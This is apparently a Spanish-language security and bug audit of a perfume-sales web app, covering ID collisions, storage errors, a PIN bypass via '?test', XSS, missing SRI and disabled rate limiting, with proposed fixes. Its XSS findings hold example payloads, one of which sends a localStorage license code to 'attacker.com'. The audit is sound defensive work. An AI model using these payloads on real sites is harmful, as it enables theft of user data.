Módulo: Registro de ventas (addVenta)
🔴
ID de venta = Date.now() — colisión posible

Cada venta usa id: Date.now(). Si la función se llama dos veces en el mismo milisegundo (desktop multi-tab, botón programático o test), dos ventas tendrán el mismo ID. Las operaciones de edición y borrado buscan por ID — la segunda venta quedaría huérfana o afectaría a la primera.

🔴 CRÍTICO Línea ~2684 Reproducible: 2 tabs abiertas 
ventas.unshift({id:Date.now(), ...})  // Date.now() puede repetirse
ventas.unshift({id: crypto.randomUUID(), ...})  // FIX: UUID único garantizado
🟠
Fecha futura no bloqueada a nivel de datos

El campo fecha tiene max=todayISO() en el DOM, pero si el usuario manipula el HTML (DevTools) puede enviar fecha futura. La validación del lado JavaScript verifica _fTest <= new Date() pero usa comparación de Date objects que incluye la hora — una fecha de "hoy" tarde de noche podría fallar dependiendo de la zona horaria.

🟠 ALTOLínea ~2677
🟡
Ganancia negativa: segundo tap tiene ventana de 5 segundos global

_negGainPending y _negGainTimer son variables globales. Si el usuario tiene dos formularios de venta abiertos simultáneamente (impossible en la UI actual pero posible con DevTools), el flag se comparte. Más importante: el timer de 5s se limpia con clearTimeout pero no se verifica si es el mismo contexto.

🟡 MEDIOLíneas 2633-2671
Módulo: Cuotas y cobros
🟠
calcDebe() puede retornar negativo silenciosamente

Si los pagos registrados superan el precio de venta (pagos extra), calcDebe = Math.max(0, precioVenta - totalPagado) retorna 0 correctamente. Pero _estimarFechaCuota y los cálculos de "cuota sugerida" usan Math.ceil(debe / Math.max(1, totalC - pagadas)) — si pagadas >= totalC pero hay pagos extra, el denominador puede ser 0 o negativo produciendo NaN o Infinity en pantalla.

🟠 ALTOLínea ~2524
🟡
diasDesdeUltimoPago no maneja zonas horarias

new Date(a, m-1, d) construye fecha en hora local (medianoche). Date.now() es UTC. La diferencia puede ser ±1 día dependiendo del huso horario del usuario, causando que cuotas se clasifiquen como "urgente" o "al día" incorrectamente.

🟡 MEDIOLínea ~1822
Módulo: Backup y restauración
🔴
_validarSchemaBackup rechaza backup con 0 ventas

La función retorna error si data.ventas.length === 0: "El backup no contiene ventas". Una usuaria nueva que hace backup antes de registrar ventas (para tener el backup del perfil con gastos o stock), nunca podrá restaurar ese archivo. Error de diseño: backup ≠ ventas.

🔴 CRÍTICOLínea ~1992
if (!data.ventas || data.ventas.length === 0) return '⚠ El backup no contiene ventas...';
// FIX: no bloquear restauración de backups válidos sin ventas
// Solo advertir, no bloquear:
if (data.ventas?.length === 0) { /* opcional: warn en lugar de error */ }
🟠
Errores silenciosos en save() — usuario no sabe si los datos se guardaron

_saveNow() envuelve las escrituras en try/finally pero no notifica al usuario si algún PTDB.set() falla. En IndexedDB, los errores de escritura (disco lleno, storage bloqueado en modo privado) se resuelven silenciosamente. El usuario puede creer que guardó y no es así.

🟠 ALTOLíneas 1667-1682
Módulo: Stock y perfumes
🟠
Stock negativo posible via "Agregar venta" con autoincrement

Cuando se guarda una venta, el código hace if(sp.stock > 0) sp.stock--. Pero si la usuaria edita el stock a 0 en un tab, y en otro tab guarda una venta del mismo perfume, el stock ya está en 0 y el decremento no se aplica — pero si está en 1, baja a 0. No hay bloqueo de stock negativo si otro proceso lo pone en -1 directamente via edición manual: p.stock = parseInt(document.getElementById('edit-stock').value) || 0 — si el usuario pone -5, se guarda.

BUG-01: PIN bypass via ?test en la URL

Cómo reproducir: Abrir la app en parfumtrack.pages.dev/?test. El código en línea 4857 detecta location.search.includes('test') y llama enterAppAfterPin() saltando completamente el PIN.

Impacto: Cualquier persona con acceso físico al celular (o que conozca la URL) puede ver todos los datos sin conocer el PIN. El PIN como capa de seguridad es inútil.

🔴 CRÍTICOLínea 4857
if (location.search.includes('test')) { setTimeout(function(){ enterAppAfterPin(); }, 100); return; }
// FIX INMEDIATO: eliminar esta línea completamente en producción
// O restringir a localhost únicamente:
// if (location.hostname === 'localhost' && location.search.includes('test')) { ... }
🔴
BUG-02: XSS via p.foto sin escapar en renderStock() y renderCatalogo()

Cómo reproducir: Restaurar un backup con p.foto = "\" onerror=\"alert(document.cookie)\"" o editar un perfume y pegar una URL maliciosa. El código renderiza <img src="${p.foto}"> sin escapeHTML.

Impacto: XSS confirmado via backup externo. Un atacante puede enviar un archivo JSON modificado y robar localStorage (licencia, email, número de WhatsApp). En renderCatalogo ya existe un onerror attribute que facilitaría la inyección.

🔴 CRÍTICOLíneas ~2553, ~5576
// renderStock() — VULNERABLE
const thumb=p.foto?`<img src="${p.foto}" alt="" ...>`:'🍶';
const thumb=p.foto?`<img src="${escapeHTML(p.foto)}" alt="" ...>`:'🍶';  // FIX

// renderCatalogo() — VULNERABLE (tiene onerror existente que facilita el ataque)
const thumb = p.foto ? `<img src="${p.foto}" alt="${p.nombre}" onerror="this.style.display='none'">` : '🍶';
const thumb = p.foto ? `<img src="${escapeHTML(p.foto)}" alt="${escapeHTML(p.nombre)}" onerror="this.style.display='none'">` : '🍶';  // FIX

BUG-03: toast() usa innerHTML — XSS secundario si nombre de perfume llega sin escapar

Cómo reproducir: En guardarEdicionPerfume(), la línea toast(`✓ "${p.nombre}" actualizado`) no usa escapeHTML. Si p.nombre contiene HTML (p.ej: <img src=x onerror=fetch('https://attacker.com?d='+encodeURIComponent(localStorage.getItem('pt_activated_code')))>), se ejecuta.

Vector: Restaurar backup malicioso + ir a Stock + editar cualquier perfume. Los nombres de perfumes en VARIOS toasts no están sanitizados.

toast(`🍶 "${escapeHTML(p.nombre)}" eliminado del stock`, ...) // toastUndo sí usa escapeHTML

BUG-04: KV namespace "REEMPLAZAR_CON_ID_REAL" — rate limiting inactivo

Confirmado en código: wrangler.jsonc línea 25. El binding PT_LICENSES apunta a un ID placeholder. En producción, env.PT_LICENSES es undefined, por lo que checkRateLimit() retorna null (sin límite) en todo caso.

Impacto: El endpoint /backup acepta requests ilimitados. Un atacante puede hacer fuerza bruta de códigos de licencia o generar DoS sin restricción.

BUG-06: CDN scripts sin SRI (Subresource Integrity)

Chart.js, jsPDF y XLSX se cargan dinámicamente desde cdnjs.cloudflare.com sin integrity ni crossorigin attributes. Si el CDN es comprometido o sufre MITM, código malicioso se ejecutaría con acceso completo a los datos del usuario (ventas, licencia, WhatsApp).

🟠 ALTOLíneas ~5518-5528
const s = document.createElement('script');
s.src = url; s.onload = resolve; s.onerror = reject;
s.integrity = 'sha384-...'; // hash SRI del archivo específico
s.crossOrigin = 'anonymous';

BUG-07: Backup local descarga sin confirmación de éxito

backupData() llama a.click() y luego inmediatamente localStorage.setItem('pt_last_backup', Date.now()). El click en el anchor para descargar puede ser bloqueado por el navegador (política de popups bloqueados, especialmente en iOS Safari). El timestamp de "último backup" se guarda aunque la descarga nunca haya ocurrido.

BUG-08: IndexedDB init silencia errores — app carga sin storage

PTDB.init() en su onerror llama resolve() (no reject). Si IndexedDB falla (modo privado iOS, almacenamiento lleno, corrupto), la app carga con PTDB.db = null. Todas las operaciones de save() serán silenciosamente descartadas. El usuario registra ventas que desaparecen al cerrar la app.

🟠 ALTOLínea ~1591
req.onerror = () => resolve(); // silencia error crítico!
req.onerror = (e) => {
  console.error('[IDB] init failed', e);
  toast('⚠ Error de almacenamiento. Tus datos podrían no guardarse. Usá Chrome/Firefox.', 7000, 'error');
  resolve(); // seguir cargando pero avisar al usuario
};

BUG-09: Stock puede editarse a valor negativo

En guardarEdicionPerfume(): p.stock = parseInt(document.getElementById('edit-stock').value) || 0. Si el usuario escribe "-5", parseInt("-5") = -5 y se guarda. El renderizador no previene stocks negativos — mostraría "Stock bajo" con número negativo.

BUG-11: WhatsApp links usan window.open() — bloqueado por Safari iOS

Todos los window.open(`https://wa.me/...`) son llamados en handlers async o con setTimeout. Safari iOS bloquea window.open() si no es llamado directamente desde un evento de usuario (sin async/timeout). Las usuarias con iPhone (mercado principal) podrían no poder enviar recordatorios de cobro.

renderGanancias() llama renderChartMeses() en cada render — Chart.js destruye y recrea el canvas cada vez. Para 12+ meses de datos esto es notablemente lento.

Veredicto del equipo técnico
¿Lanzarías esta aplicación hoy a 100.000 usuarios?
🔴 NO — Hay 4 bugs críticos de seguridad que deben corregirse primero.

Un PIN que se puede saltar con ?test, XSS via backup y rate limiting desactivado son bloqueantes absolutos para un lanzamiento masivo. Sin embargo, son todos corregibles en menos de 2 horas de trabajo.

¿Qué falta exactamente para ser un SÍ?
Las 8 correcciones de seguridad de la Fase 4 + feedback de IDB + backup con 0 ventas. Estimado: 4-6 horas de trabajo.
¿Cuál es la principal debilidad técnica?
El monolito de 7.009 líneas que imposibilita tests, debugging, colaboración y una CSP sólida.
¿Cuál es la principal fortaleza técnica?
El producto FUNCIONA bien para su propósito. PWA offline-first con IndexedDB, virtual scroll, debounce, UX móvil sólida y HMAC-SHA256 para licencias son decisiones técnicas correctas.
¿Qué riesgo futuro más grande hay?
La ausencia de sincronización multi-dispositivo. Las usuarias eventualmente van a querer usar la app en 2 celulares o cambiar de teléfono. La arquitectura local-first actual no lo soporta bien.
